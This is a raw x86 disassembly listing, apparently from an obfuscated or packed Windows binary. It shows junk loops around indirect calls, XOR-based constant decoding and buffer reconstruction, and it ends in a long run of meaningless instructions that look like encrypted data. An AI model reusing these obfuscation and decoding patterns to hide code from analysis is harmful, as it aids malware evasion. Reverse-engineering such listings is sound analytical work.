  41c3a0:	cmp    ebx,DWORD PTR [ebp-0x7c]
  41c3a3:	jne    0x41c335
  41c3a9:	mov    eax,DWORD PTR [ebp-0x1c]
  41c3ac:	mov    eax,DWORD PTR [eax]
  41c3ae:	pop    edi
  41c3af:	pop    esi
  41c3b0:	pop    ebx
  41c3b1:	leave  
  41c3b2:	ret    0xc
  41c3b5:	push   ebp
  41c3b6:	mov    ebp,esp
  41c3b8:	sub    esp,0xa4
  41c3be:	mov    ecx,DWORD PTR [ebp+0x8]
  41c3c1:	and    DWORD PTR ds:0x42a01c,0x0
  41c3cb:	jmp    0x41c3db
  41c3d0:	mov    eax,ds:0x42a01c
  41c3d5:	inc    eax
  41c3d6:	mov    ds:0x42a01c,eax
  41c3db:	cmp    DWORD PTR ds:0x42a01c,0x17
  41c3e2:	jae    0x41c404
  41c3e8:	cmp    DWORD PTR ds:0x42a01c,0x25
  41c3ef:	jne    0x41c3fe
  41c3f5:	push   DWORD PTR [ebp-0x14]
  41c3f8:	call   DWORD PTR ds:0x42401c
  41c3fe:	jmp    0x41c3d0
  41c403:	inc    eax
  41c404:	mov    eax,0x8a85
  41c409:	sub    DWORD PTR ds:0x42a008,0x36bb
  41c413:	xor    ax,WORD PTR [ecx+0x20]
  41c417:	mov    DWORD PTR ds:0x42c018,0x1e
  41c421:	cmp    DWORD PTR ds:0x42c018,0x0
  41c428:	je     0x41c465
  41c42e:	cmp    DWORD PTR ds:0x42c018,0x25
  41c435:	jne    0x41c449
  41c43b:	push   DWORD PTR [ebp-0x10]
  41c43e:	push   0x3dbe
  41c443:	call   DWORD PTR ds:0x424020
  41c449:	mov    ecx,DWORD PTR ds:0x42c018
  41c44f:	dec    ecx
  41c450:	mov    DWORD PTR ds:0x42c018,ecx
  41c456:	jmp    0x41c421
  41c45b:	sub    DWORD PTR ds:0x428014,0x2577
  41c465:	mov    ecx,0x3b4b
  41c46a:	xor    DWORD PTR ds:0x42b00c,0x43e8
  41c474:	add    ax,cx
  41c477:	mov    DWORD PTR ds:0x429004,0x1e
  41c481:	cmp    DWORD PTR ds:0x429004,0x0
  41c488:	je     0x41c4e7
  41c48e:	cmp    DWORD PTR ds:0x429004,0x2c
  41c495:	jne    0x41c4c5
  41c49b:	push   0x42c000
  41c4a0:	push   0x3d75
  41c4a5:	push   DWORD PTR [ebp-0x20]
  41c4a8:	push   0x42c004
  41c4ad:	push   DWORD PTR [ebp-0xc]
  41c4b0:	push   0x4237e2
  41c4b5:	push   0x75d0
  41c4ba:	push   0x7026
  41c4bf:	call   DWORD PTR ds:0x424024
  41c4c5:	xor    ecx,ecx
  41c4c7:	add    ecx,DWORD PTR ds:0x429004
  41c4cd:	dec    ecx
  41c4ce:	mov    DWORD PTR ds:0x429004,ecx
  41c4d4:	jmp    0x41c481
  41c4d9:	mov    ecx,DWORD PTR ds:0x421a86
  41c4df:	mov    ecx,DWORD PTR [ecx]
  41c4e1:	and    DWORD PTR ds:0x428024,ecx
  41c4e7:	movzx  eax,ax
  41c4ea:	xor    DWORD PTR ds:0x42a004,0x42801c
  41c4f4:	mov    DWORD PTR [ebp-0x18],eax
  41c4f7:	and    DWORD PTR ds:0x42801c,0x7f28
  41c501:	mov    BYTE PTR [ebp-0x1],0x61
  41c505:	xor    ecx,0x4092
  41c50b:	lea    eax,[ebp-0x1]
  41c50e:	sub    DWORD PTR ds:0x429008,0x31e1
  41c518:	mov    DWORD PTR [ebp-0x10],eax
  41c51b:	add    ecx,DWORD PTR ds:0x428010
  41c521:	mov    al,BYTE PTR [ebp-0x1]
  41c524:	and    ecx,0x7ba8
  41c52a:	mov    ecx,DWORD PTR [ebp-0x10]
  41c52d:	xor    al,0x6f
  41c52f:	and    DWORD PTR ds:0x428008,0x42b018
  41c539:	sub    al,0xd
  41c53b:	adc    DWORD PTR ds:0x428018,0x42b008
  41c545:	mov    BYTE PTR [ecx],al
  41c547:	add    DWORD PTR ds:0x42a01c,ecx
  41c54d:	mov    DWORD PTR [ebp-0x14],0xf89c85b6
  41c554:	mov    DWORD PTR ds:0x42a010,0x1c
  41c55e:	cmp    DWORD PTR ds:0x42a010,0x0
  41c565:	je     0x41c5a5
  41c56b:	cmp    DWORD PTR ds:0x42a010,0x2c
  41c572:	jne    0x41c58b
  41c578:	push   0x5aa3
  41c57d:	push   0x697d
  41c582:	push   DWORD PTR [ebp-0x28]
  41c585:	call   DWORD PTR ds:0x424028
  41c58b:	xor    ecx,ecx
  41c58d:	add    ecx,DWORD PTR ds:0x42a010
  41c593:	dec    ecx
  41c594:	mov    DWORD PTR ds:0x42a010,ecx
  41c59a:	jmp    0x41c55e
  41c59f:	sbb    DWORD PTR ds:0x42a000,ebx
  41c5a5:	push   ebx
  41c5a6:	sbb    eax,ecx
  41c5a8:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  41c5af:	and    DWORD PTR ds:0x428020,0x0
  41c5b9:	jmp    0x41c5cb
  41c5be:	mov    ecx,DWORD PTR ds:0x428020
  41c5c4:	inc    ecx
  41c5c5:	mov    DWORD PTR ds:0x428020,ecx
  41c5cb:	cmp    DWORD PTR ds:0x428020,0x19
  41c5d2:	jae    0x41c5fa
  41c5d8:	cmp    DWORD PTR ds:0x428020,0x28
  41c5df:	jne    0x41c5f5
  41c5e5:	push   0x423938
  41c5ea:	push   0x42389d
  41c5ef:	call   DWORD PTR ds:0x424030
  41c5f5:	jmp    0x41c5be
  41c5fa:	mov    ecx,DWORD PTR [ebp-0x14]
  41c5fd:	push   esi
  41c5fe:	movzx  esi,BYTE PTR ds:0x42a014
  41c605:	sub    esi,DWORD PTR ds:0x429018
  41c60b:	mov    DWORD PTR ds:0x42a014,esi
  41c611:	mov    eax,0x7510893
  41c616:	mov    esi,DWORD PTR ds:0x42a01c
  41c61c:	adc    esi,DWORD PTR ds:0x42a00c
  41c622:	mov    DWORD PTR ds:0x42a01c,esi
  41c628:	xor    ecx,eax
  41c62a:	neg    esi
  41c62c:	mov    esi,0x3272db
  41c631:	push   edi
  41c632:	add    ecx,esi
  41c634:	mov    DWORD PTR ds:0x42b018,0x6b60
  41c63e:	jmp    0x41c662
  41c643:	mov    DWORD PTR ds:0x42b000,0x231b
  41c64d:	mov    dl,BYTE PTR [ebp-0x1]
  41c650:	mov    DWORD PTR ds:0x42a018,0x496a
  41c65a:	mov    BYTE PTR [ebp+ecx*1-0xa4],dl
  41c661:	inc    ecx
  41c662:	mov    DWORD PTR ds:0x429014,0x116e
  41c66c:	cmp    ecx,0x40
  41c66f:	mov    DWORD PTR ds:0x42a014,0x7e65
  41c679:	jb     0x41c643
  41c67f:	and    edx,DWORD PTR ds:0x428008
  41c685:	mov    edx,DWORD PTR [ebp-0x14]
  41c688:	sbb    DWORD PTR ds:0x429004,0x429010
  41c692:	xor    edx,eax
  41c694:	add    edx,esi
  41c696:	jmp    0x41c829
  41c69b:	mov    DWORD PTR ds:0x429018,0x1f
  41c6a5:	cmp    DWORD PTR ds:0x429018,0x0
  41c6ac:	je     0x41c713
  41c6b2:	cmp    DWORD PTR ds:0x429018,0xf
  41c6b9:	jne    0x41c6dd
  41c6bf:	push   DWORD PTR [ebp-0x20]
  41c6c2:	push   DWORD PTR [ebp-0x10]
  41c6c5:	push   0x45b6
  41c6ca:	push   DWORD PTR [ebp-0x1c]
  41c6cd:	push   0x5bd1
  41c6d2:	push   0x42c008
  41c6d7:	call   DWORD PTR ds:0x424038
  41c6dd:	cmp    DWORD PTR ds:0x429018,0x10
  41c6e4:	jne    0x41c6f7
  41c6ea:	mov    edi,DWORD PTR ds:0x429018
  41c6f0:	dec    edi
  41c6f1:	mov    DWORD PTR ds:0x429018,edi
  41c6f7:	mov    edi,DWORD PTR ds:0x429018
  41c6fd:	dec    edi
  41c6fe:	mov    DWORD PTR ds:0x429018,edi
  41c704:	jmp    0x41c6a5
  41c709:	or     DWORD PTR ds:0x42a000,0x7430
  41c713:	mov    edi,DWORD PTR [ebp+0x8]
  41c716:	mov    DWORD PTR ds:0x428028,0x1e
  41c720:	cmp    DWORD PTR ds:0x428028,0x0
  41c727:	je     0x41c766
  41c72d:	cmp    DWORD PTR ds:0x428028,0x2e
  41c734:	jne    0x41c74a
  41c73a:	push   0x42a008
  41c73f:	push   0x6949
  41c744:	call   DWORD PTR ds:0x42403c
  41c74a:	mov    ecx,DWORD PTR ds:0x428028
  41c750:	dec    ecx
  41c751:	mov    DWORD PTR ds:0x428028,ecx
  41c757:	jmp    0x41c720
  41c75c:	adc    DWORD PTR ds:0x42b00c,0x42c008
  41c766:	mov    ecx,0x8a85
  41c76b:	add    DWORD PTR ds:0x42b000,0x429018
  41c775:	xor    cx,WORD PTR [edi+edx*4+0x2]
  41c77a:	and    DWORD PTR ds:0x428018,0x0
  41c784:	jmp    0x41c796
  41c789:	mov    edi,DWORD PTR ds:0x428018
  41c78f:	inc    edi
  41c790:	mov    DWORD PTR ds:0x428018,edi
  41c796:	cmp    DWORD PTR ds:0x428018,0x1a
  41c79d:	jae    0x41c7d2
  41c7a3:	cmp    DWORD PTR ds:0x428018,0x25
  41c7aa:	jne    0x41c7c0
  41c7b0:	push   0x55c3
  41c7b5:	push   0x423913
  41c7ba:	call   DWORD PTR ds:0x424040
  41c7c0:	jmp    0x41c789
  41c7c5:	movzx  edi,WORD PTR ds:0x42901c
  41c7cc:	sub    DWORD PTR ds:0x42b00c,edi
  41c7d2:	mov    edi,0x3b4b
  41c7d7:	add    cx,di
  41c7da:	movzx  ecx,cx
  41c7dd:	mov    DWORD PTR [ebp-0x10],ecx
  41c7e0:	mov    ecx,DWORD PTR [ebp+0x8]
  41c7e3:	sub    DWORD PTR ds:0x428004,0x4ea
  41c7ed:	movzx  ecx,WORD PTR [ecx+edx*4]
  41c7f1:	add    DWORD PTR ds:0x42b01c,0x42b000
  41c7fb:	xor    ecx,0x8a85
  41c801:	sub    DWORD PTR ds:0x428014,0x428000
  41c80b:	add    ecx,edi
  41c80d:	mov    edi,DWORD PTR [ebp-0x10]
  41c810:	mov    DWORD PTR ds:0x42b004,0x1d90
  41c81a:	mov    BYTE PTR [ebp+edi*1-0xa4],cl
  41c821:	movzx  ecx,BYTE PTR ds:0x428010
  41c828:	inc    edx
  41c829:	mov    ecx,DWORD PTR [ebp-0x18]
  41c82c:	cmp    edx,ecx
  41c82e:	mov    DWORD PTR ds:0x429018,0x3a83
  41c838:	jne    0x41c69b
  41c83e:	and    edx,edx
  41c840:	mov    ecx,DWORD PTR [ebp-0x14]
  41c843:	mov    edx,DWORD PTR [ebp+0x10]
  41c846:	add    DWORD PTR ds:0x42c008,0x32e9
  41c850:	xor    ecx,eax
  41c852:	add    ecx,esi
  41c854:	sub    DWORD PTR ds:0x428020,0x428004
  41c85e:	mov    DWORD PTR [edx],ecx
  41c860:	sub    DWORD PTR ds:0x428028,0x1657
  41c86a:	mov    ecx,DWORD PTR [ebp-0x14]
  41c86d:	xor    ecx,eax
  41c86f:	sub    DWORD PTR ds:0x42b01c,0x42c010
  41c879:	add    ecx,esi
  41c87b:	mov    DWORD PTR [ebp-0x20],ecx
  41c87e:	mov    ecx,DWORD PTR ds:0x42a00c
  41c884:	mov    DWORD PTR [ebp+0x8],0xf89c85b6
  41c88b:	mov    DWORD PTR [ebp-0xc],0xf89c85a6
  41c892:	mov    DWORD PTR [ebp-0x1c],0xf89c95b6
  41c899:	movzx  ecx,WORD PTR ds:0x42a004
  41c8a0:	mov    ecx,DWORD PTR [ebp-0xc]
  41c8a3:	mov    DWORD PTR [ebp+0x8],ecx
  41c8a6:	mov    DWORD PTR ds:0x42b008,0x111a
  41c8b0:	jmp    0x41cb0e
  41c8b5:	xor    edx,0x5725
  41c8bb:	mov    ecx,DWORD PTR [ebp+0x8]
  41c8be:	mov    edx,DWORD PTR ds:0x42b000
  41c8c4:	add    DWORD PTR ds:0x42b01c,edx
  41c8ca:	mov    edx,DWORD PTR [ebp-0x8]
  41c8cd:	xor    ecx,eax
  41c8cf:	xor    edx,eax
  41c8d1:	sub    ecx,edx
  41c8d3:	sub    ecx,esi
  41c8d5:	and    DWORD PTR ds:0x428000,0x0
  41c8df:	mov    edx,DWORD PTR ds:0x428000
  41c8e5:	inc    edx
  41c8e6:	mov    DWORD PTR ds:0x428000,edx
  41c8ec:	cmp    DWORD PTR ds:0x428000,0xb
  41c8f3:	jne    0x41c904
  41c8f9:	push   0x4238fe
  41c8fe:	call   DWORD PTR ds:0x424044
  41c904:	cmp    DWORD PTR ds:0x428000,0xa
  41c90b:	jne    0x41c91e
  41c911:	mov    edx,DWORD PTR ds:0x428000
  41c917:	inc    edx
  41c918:	mov    DWORD PTR ds:0x428000,edx
  41c91e:	cmp    DWORD PTR ds:0x428000,0x15
  41c925:	jb     0x41c8df
  41c92b:	and    DWORD PTR ds:0x429018,0x0
  41c935:	jmp    0x41c949
  41c93a:	xor    edx,edx
  41c93c:	xor    edx,DWORD PTR ds:0x429018
  41c942:	inc    edx
  41c943:	mov    DWORD PTR ds:0x429018,edx
  41c949:	cmp    DWORD PTR ds:0x429018,0x10
  41c950:	jae    0x41c9c2
  41c956:	cmp    DWORD PTR ds:0x429018,0x17
  41c95d:	jne    0x41c976
  41c963:	push   DWORD PTR [ebp-0x24]
  41c966:	push   0x42801c
  41c96b:	push   0x423a34
  41c970:	call   DWORD PTR ds:0x424048
  41c976:	jmp    0x41c93a
  41c97b:	and    DWORD PTR ds:0x42c004,0x0
  41c985:	mov    edx,DWORD PTR ds:0x42c004
  41c98b:	inc    edx
  41c98c:	mov    DWORD PTR ds:0x42c004,edx
  41c992:	cmp    DWORD PTR ds:0x42c004,0x1e
  41c999:	jne    0x41c9af
  41c99f:	push   0x42b018
  41c9a4:	push   0x6f2d
  41c9a9:	call   DWORD PTR ds:0x424014
  41c9af:	cmp    DWORD PTR ds:0x42c004,0x16
  41c9b6:	jb     0x41c985
  41c9bc:	and    DWORD PTR ds:0x42c014,ecx
  41c9c2:	xor    ecx,eax
  41c9c4:	adc    DWORD PTR ds:0x42c01c,0x41e5
  41c9ce:	mov    DWORD PTR [ebp+0x8],ecx
  41c9d1:	and    DWORD PTR ds:0x429010,0x0
  41c9db:	xor    edx,edx
  41c9dd:	xor    edx,DWORD PTR ds:0x429010
  41c9e3:	inc    edx
  41c9e4:	mov    DWORD PTR ds:0x429010,edx
  41c9ea:	cmp    DWORD PTR ds:0x429010,0x4
  41c9f1:	jne    0x41ca1f
  41c9f7:	push   DWORD PTR [ebp-0x14]
  41c9fa:	push   0x42b010
  41c9ff:	push   0x6800
  41ca04:	push   0x42a000
  41ca09:	push   DWORD PTR [ebp-0x10]
  41ca0c:	push   0x5c37
  41ca11:	push   0x63a5
  41ca16:	push   DWORD PTR [ebp-0x1c]
  41ca19:	call   DWORD PTR ds:0x424018
  41ca1f:	cmp    DWORD PTR ds:0x429010,0x3
  41ca26:	jne    0x41ca3b
  41ca2c:	xor    edx,edx
  41ca2e:	add    edx,DWORD PTR ds:0x429010
  41ca34:	inc    edx
  41ca35:	mov    DWORD PTR ds:0x429010,edx
  41ca3b:	cmp    DWORD PTR ds:0x429010,0x1e
  41ca42:	jb     0x41c9db
  41ca48:	and    edx,0x1801
  41ca4e:	mov    ecx,DWORD PTR [ebp+0x8]
  41ca51:	and    DWORD PTR ds:0x42c018,0x0
  41ca5b:	jmp    0x41ca6f
  41ca60:	xor    edx,edx
  41ca62:	add    edx,DWORD PTR ds:0x42c018
  41ca68:	inc    edx
  41ca69:	mov    DWORD PTR ds:0x42c018,edx
  41ca6f:	cmp    DWORD PTR ds:0x42c018,0x1f
  41ca76:	jae    0x41cab1
  41ca7c:	cmp    DWORD PTR ds:0x42c018,0x12
  41ca83:	jne    0x41ca92
  41ca89:	push   DWORD PTR [ebp-0x28]
  41ca8c:	call   DWORD PTR ds:0x42401c
  41ca92:	cmp    DWORD PTR ds:0x42c018,0x11
  41ca99:	jne    0x41caac
  41ca9f:	mov    edx,DWORD PTR ds:0x42c018
  41caa5:	inc    edx
  41caa6:	mov    DWORD PTR ds:0x42c018,edx
  41caac:	jmp    0x41ca60
  41cab1:	mov    edx,DWORD PTR [ebp-0x64]
  41cab4:	lea    ecx,[edx+ecx*1+0x5708f5]
  41cabb:	mov    DWORD PTR [ebp-0x64],ecx
  41cabe:	mov    ecx,DWORD PTR [ebp+0x8]
  41cac1:	mov    edx,DWORD PTR [ebp-0x60]
  41cac4:	lea    ecx,[edx+ecx*1+0x5708f5]
  41cacb:	mov    DWORD PTR [ebp-0x60],ecx
  41cace:	mov    ecx,DWORD PTR [ebp+0x8]
  41cad1:	mov    edx,DWORD PTR [ebp-0x5c]
  41cad4:	lea    ecx,[edx+ecx*1+0x5708f4]
  41cadb:	mov    DWORD PTR [ebp-0x5c],ecx
  41cade:	mov    ecx,DWORD PTR [ebp+0x8]
  41cae1:	mov    edx,DWORD PTR [ebp-0x58]
  41cae4:	lea    ecx,[edx+ecx*1+0x5708fb]
  41caeb:	mov    DWORD PTR [ebp-0x58],ecx
  41caee:	mov    ecx,DWORD PTR [ebp+0x8]
  41caf1:	mov    edx,DWORD PTR [ebp-0x54]
  41caf4:	lea    ecx,[edx+ecx*1+0x5708fa]
  41cafb:	mov    DWORD PTR [ebp-0x54],ecx
  41cafe:	mov    ecx,DWORD PTR [ebp+0x8]
  41cb01:	mov    edx,DWORD PTR [ebp-0x50]
  41cb04:	lea    ecx,[edx+ecx*1+0x5708f9]
  41cb0b:	mov    DWORD PTR [ebp-0x50],ecx
  41cb0e:	mov    ecx,DWORD PTR [ebp+0x8]
  41cb11:	xor    ecx,eax
  41cb13:	add    ecx,esi
  41cb15:	jne    0x41c8b5
  41cb1b:	jmp    0x41f062
  41cb20:	mov    ecx,DWORD PTR [ebp-0x1c]
  41cb23:	mov    edx,DWORD PTR [ebp-0x8]
  41cb26:	xor    ecx,eax
  41cb28:	xor    edx,eax
  41cb2a:	sub    ecx,edx
  41cb2c:	sub    ecx,esi
  41cb2e:	xor    ecx,eax
  41cb30:	mov    DWORD PTR [ebp-0x1c],ecx
  41cb33:	mov    ecx,DWORD PTR [ebp-0xc]
  41cb36:	mov    DWORD PTR [ebp+0x8],ecx
  41cb39:	jmp    0x41cb6b
  41cb3e:	mov    ecx,DWORD PTR [ebp+0x8]
  41cb41:	mov    edx,DWORD PTR [ebp-0x8]
  41cb44:	xor    ecx,eax
  41cb46:	xor    edx,eax
  41cb48:	sub    ecx,edx
  41cb4a:	sub    ecx,esi
  41cb4c:	xor    ecx,eax
  41cb4e:	mov    DWORD PTR [ebp+0x8],ecx
  41cb51:	mov    ecx,DWORD PTR [ebp+0x8]
  41cb54:	mov    edx,DWORD PTR [ebp+0x8]
  41cb57:	imul   edx,edx,0x5708f5
  41cb5d:	xor    ecx,eax
  41cb5f:	add    ecx,esi
  41cb61:	lea    ecx,[ebp+ecx*4-0x64]
  41cb65:	mov    edi,DWORD PTR [ecx]
  41cb67:	add    edx,edi
  41cb69:	mov    DWORD PTR [ecx],edx
  41cb6b:	mov    ecx,DWORD PTR [ebp+0x8]
  41cb6e:	xor    ecx,eax
  41cb70:	add    ecx,esi
  41cb72:	jne    0x41cb3e
  41cb78:	mov    ecx,DWORD PTR [ebp-0x20]
  41cb7b:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  41cb82:	mov    dl,BYTE PTR [ebp-0x1]
  41cb85:	cmp    cl,dl
  41cb87:	je     0x41cc60
  41cb8d:	mov    ecx,DWORD PTR [ebp-0x20]
  41cb90:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  41cb97:	mov    edx,DWORD PTR [ebp+0xc]
  41cb9a:	cmp    cl,BYTE PTR [edx]
  41cb9c:	jne    0x41f074
  41cba2:	mov    ecx,DWORD PTR [ebp-0x14]
  41cba5:	mov    edx,DWORD PTR [ebp+0xc]
  41cba8:	movsx  edx,BYTE PTR [edx]
  41cbab:	xor    ecx,eax
  41cbad:	add    ecx,esi
  41cbaf:	cmp    edx,ecx
  41cbb1:	mov    ecx,DWORD PTR [ebp-0xc]
  41cbb4:	mov    DWORD PTR [ebp+0x8],ecx
  41cbb7:	mov    ecx,DWORD PTR [ebp+0x8]
  41cbba:	je     0x421451
  41cbc0:	jmp    0x41cbf5
  41cbc5:	mov    ecx,DWORD PTR [ebp+0x8]
  41cbc8:	mov    edx,DWORD PTR [ebp-0x8]
  41cbcb:	xor    ecx,eax
  41cbcd:	xor    edx,eax
  41cbcf:	sub    ecx,edx
  41cbd1:	sub    ecx,esi
  41cbd3:	xor    ecx,eax
  41cbd5:	mov    DWORD PTR [ebp+0x8],ecx
  41cbd8:	mov    ecx,DWORD PTR [ebp+0x8]
  41cbdb:	mov    edx,DWORD PTR [ebp+0x8]
  41cbde:	xor    ecx,eax
  41cbe0:	imul   edx,edx,0x5708f5
  41cbe6:	add    ecx,esi
  41cbe8:	lea    ecx,[ebp+ecx*4-0x64]
  41cbec:	mov    edi,DWORD PTR [ecx]
  41cbee:	add    edx,edi
  41cbf0:	mov    DWORD PTR [ecx],edx
  41cbf2:	mov    ecx,DWORD PTR [ebp+0x8]
  41cbf5:	xor    ecx,eax
  41cbf7:	add    ecx,esi
  41cbf9:	jne    0x41cbc5
  41cbff:	mov    ecx,DWORD PTR [ebp-0x14]
  41cc02:	mov    edx,DWORD PTR [ebp+0x8]
  41cc05:	xor    ecx,eax
  41cc07:	xor    edx,eax
  41cc09:	add    ecx,esi
  41cc0b:	add    edx,esi
  41cc0d:	cmp    ecx,edx
  41cc0f:	jae    0x41f008
  41cc15:	lea    edx,[ecx-0x3272db]
  41cc1b:	mov    DWORD PTR [ebp-0x18],edx
  41cc1e:	mov    edi,DWORD PTR [ebp-0x18]
  41cc21:	mov    DWORD PTR [ebp-0x24],0x705fd08
  41cc28:	lea    edx,[ebp-0x24]
  41cc2b:	mov    DWORD PTR [ebp-0x10],edx
  41cc2e:	mov    edx,DWORD PTR [ebp-0x10]
  41cc31:	add    DWORD PTR [edx],0x705fa08
  41cc37:	mov    ebx,DWORD PTR [ebp-0x10]
  41cc3a:	xor    edi,eax
  41cc3c:	add    edi,DWORD PTR [ebx]
  41cc3e:	lea    edx,[ebp+ecx*4-0x64]
  41cc42:	mov    ebx,DWORD PTR [edx]
  41cc44:	xor    edi,ebx
  41cc46:	mov    DWORD PTR [edx],edi
  41cc48:	mov    edx,DWORD PTR [ebp+0x8]
  41cc4b:	xor    edx,eax
  41cc4d:	inc    ecx
  41cc4e:	inc    DWORD PTR [ebp-0x18]
  41cc51:	add    edx,esi
  41cc53:	cmp    ecx,edx
  41cc55:	jb     0x41cc1e
  41cc5b:	jmp    0x41f008
  41cc60:	mov    ecx,DWORD PTR [ebp-0xc]
  41cc63:	mov    DWORD PTR [ebp+0x8],ecx
  41cc66:	jmp    0x41cc98
  41cc6b:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc6e:	mov    edx,DWORD PTR [ebp-0x8]
  41cc71:	xor    ecx,eax
  41cc73:	xor    edx,eax
  41cc75:	sub    ecx,edx
  41cc77:	sub    ecx,esi
  41cc79:	xor    ecx,eax
  41cc7b:	mov    DWORD PTR [ebp+0x8],ecx
  41cc7e:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc81:	mov    edx,DWORD PTR [ebp+0x8]
  41cc84:	imul   edx,edx,0x5708f5
  41cc8a:	xor    ecx,eax
  41cc8c:	add    ecx,esi
  41cc8e:	lea    ecx,[ebp+ecx*4-0x64]
  41cc92:	mov    edi,DWORD PTR [ecx]
  41cc94:	add    edx,edi
  41cc96:	mov    DWORD PTR [ecx],edx
  41cc98:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc9b:	jmp    0x41effe
  41cca0:	mov    dl,0xcf
  41cca2:	enter  0x872f,0x27
  41cca6:	imul   ebp,DWORD PTR [edi+0x65],0x47d7ebdc
  41ccad:	test   eax,0xfc975795
  41ccb2:	popa   
  41ccb3:	bound  edi,QWORD PTR [edi+ebx*2]
  41ccb6:	bound  esp,QWORD PTR [edx-0x7f]
  41ccb9:	xor    al,0x4e
  41ccbb:	repnz arpl WORD PTR [esi],cx
  41ccbe:	dec    edi
  41ccbf:	push   0x23
  41ccc1:	rcr    esi,1
  41ccc3:	inc    edx
  41ccc4:	cmp    al,0x61
  41ccc6:	je     0x41cc63
  41ccc8:	mov    dh,0x84
  41ccca:	and    bh,BYTE PTR [ebp+edi*2-0x75e23eff]
  41ccd1:	ss xchg edi,eax
  41ccd3:	adc    eax,0x42666dad
  41ccd8:	jg     0x41cd1d
  41ccda:	fnop   
  41ccdc:	xor    DWORD PTR [eax+0x56],ecx
  41ccdf:	inc    ebp
  41cce0:	(bad)  
  41cce1:	mov    cl,0xba
  41cce3:	jmp    0x9556aa9
  41cce8:	ror    BYTE PTR [edx-0x4b024322],cl
  41ccee:	mov    ebx,0xe7711501
  41ccf3:	xor    WORD PTR [ecx-0x3bf2fd51],0x4c
  41ccfb:	pop    eax
  41ccfc:	fcom   QWORD PTR [esi-0x1fcf72a4]
  41cd02:	inc    ebp
  41cd03:	sub    ebx,0xffffffbb
  41cd06:	mov    WORD PTR [ecx-0x67],ds
  41cd09:	out    dx,eax
  41cd0a:	pusha  
  41cd0b:	dec    edi
  41cd0c:	mov    edx,0x4ddb27a9
  41cd11:	scas   eax,DWORD PTR es:[edi]
  41cd12:	or     BYTE PTR [esi+0xdada4fa],ah
  41cd18:	outs   dx,BYTE PTR ds:[esi]
  41cd19:	or     bh,BYTE PTR [edi]
  41cd1b:	cmp    BYTE PTR [ebx-0x5438dccd],bh
  41cd21:	div    esi
  41cd23:	jae    0x41cd5a
  41cd25:	mov    ds:0xc353da2c,al
  41cd2a:	and    dh,BYTE PTR gs:[esi]
  41cd2d:	out    0x6b,al
  41cd2f:	sub    al,0x34
  41cd31:	loope  0x41cd47
  41cd33:	jb     0x41cd99
  41cd35:	jmp    esi
  41cd37:	mov    edi,0x2a629429
  41cd3c:	xchg   ebp,eax
  41cd3d:	sub    ebx,DWORD PTR [esi-0x1b]
  41cd40:	mov    DWORD PTR [eax-0x72e8ab20],esp
  41cd46:	push   ebp
  41cd47:	xor    eax,0x533887b0
  41cd4c:	push   eax
  41cd4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cd4e:	jge    0x41cd2d
  41cd50:	jb     0x41cd74
  41cd52:	fiadd  WORD PTR [eax+esi*2-0x31]
  41cd56:	fmul   DWORD PTR [edi+0x33]
  41cd59:	je     0x41cdaa
  41cd5b:	sub    al,0x2a
  41cd5d:	repnz cdq 
  41cd5f:	inc    esi
  41cd60:	addr16 jp 0x41cd53
  41cd63:	sub    eax,eax
  41cd65:	test   al,0x95
  41cd67:	mov    dl,0xe8
  41cd69:	or     al,0xe3
  41cd6b:	mov    edi,0x4f19fac2
  41cd70:	out    dx,eax
  41cd71:	mov    cl,0x3f
  41cd73:	mov    ebx,0x68cdf79b
  41cd78:	push   eax
  41cd79:	clc    
  41cd7a:	cmc    
  41cd7b:	jecxz  0x41cde2
  41cd7d:	fidivr DWORD PTR [ebp-0x46043230]
  41cd83:	adc    BYTE PTR [eax-0x79],al
  41cd86:	xchg   DWORD PTR ds:0x371666ae,eax
  41cd8c:	push   ecx
  41cd8d:	pop    esi
  41cd8e:	rcl    DWORD PTR [ebx+eax*8+0x9558d31],1
  41cd95:	js     0x41cde0
  41cd97:	or     al,0x64
  41cd99:	aam    0x7c
  41cd9b:	mov    bh,0x32
  41cd9d:	ror    DWORD PTR [ecx-0x3c8f04c6],0x72
  41cda4:	sti    
  41cda5:	nop
  41cda6:	inc    edi
  41cda7:	cmp    eax,0x9c6220ab
  41cdac:	and    bl,BYTE PTR [edx-0x716a0683]
  41cdb2:	repnz icebp 
  41cdb4:	cmp    eax,0xf237e69b
  41cdb9:	inc    edx
  41cdba:	fdivr  QWORD PTR [ecx]
  41cdbc:	push   cs
  41cdbd:	dec    ebx
  41cdbe:	dec    edx
  41cdbf:	mov    esi,0x844a6d5a
  41cdc4:	push   edi
  41cdc5:	ret    
  41cdc6:	mov    bh,0x8
  41cdc8:	int3   
  41cdc9:	clc    
  41cdca:	fsubr  DWORD PTR [edi]
  41cdcc:	xchg   ecx,eax
  41cdcd:	fadd   DWORD PTR [ebx+0x464dd94e]
  41cdd3:	(bad)  
  41cdd4:	mov    ds:0x5ffb5746,al
  41cdd9:	lods   al,BYTE PTR ds:[esi]
  41cdda:	repz mov bh,0x2a
  41cddd:	adc    BYTE PTR [ebp-0x28],bl
  41cde0:	mov    ebp,0x9f4536b6
  41cde5:	bound  esi,QWORD PTR [eax+0x48]
  41cde8:	(bad)  
  41cde9:	test   al,0x4f
  41cdeb:	icebp  
  41cdec:	push   0x1bbadbf5
  41cdf1:	hlt    
  41cdf2:	mov    ebp,0xeb45352c
  41cdf7:	cmp    DWORD PTR ds:0xe23c954a,esp
  41cdfd:	std    
  41cdfe:	outs   dx,DWORD PTR ds:[esi]
  41cdff:	shr    DWORD PTR [eiz*1+0x718ec0bf],0x29
  41ce07:	(bad)  
  41ce09:	mov    WORD PTR ds:0x61efe0b5,fs
  41ce0f:	(bad)  
  41ce10:	sbb    DWORD PTR [edx+ebx*1-0x79],esi
  41ce14:	sahf   
  41ce15:	leave  
  41ce16:	push   cs
  41ce17:	mov    edi,ecx
  41ce19:	test   al,0xbf
  41ce1b:	sti    
  41ce1c:	xchg   edi,eax
  41ce1d:	aam    0x27
  41ce1f:	mov    ch,0x3e
  41ce21:	pop    ebp
  41ce22:	sbb    DWORD PTR [edx],ecx
  41ce24:	mov    ebp,0x8f634f82
  41ce29:	and    eax,0xe7579af5
  41ce2e:	xor    eax,0x4452f225
  41ce33:	and    al,0x5a
  41ce35:	outs   dx,DWORD PTR ds:[esi]
